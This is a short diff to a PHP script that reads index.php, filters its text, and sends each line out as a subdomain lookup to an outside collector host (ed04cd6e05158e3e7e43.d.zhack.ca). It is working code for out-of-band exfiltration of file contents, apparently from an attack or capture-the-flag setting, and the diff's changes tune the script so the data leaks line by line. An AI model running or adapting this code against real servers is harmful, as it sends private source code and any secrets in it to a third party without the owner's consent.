@@ -1,8 +1,7 @@
 <?php
 $content = file_get_contents('index.php');
-$content = preg_replace("/[^a-zA-Z0-9]+/", "", $content);
+$content = preg_replace("/[^a-zA-Z0-9\n\r]+/", "", $content);
 foreach(explode(PHP_EOL, $content) as $exp) {
-	var_dump($exp);
 	$ch = curl_init();
 	curl_setopt($ch, CURLOPT_URL, $exp.".ed04cd6e05158e3e7e43.d.zhack.ca");
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
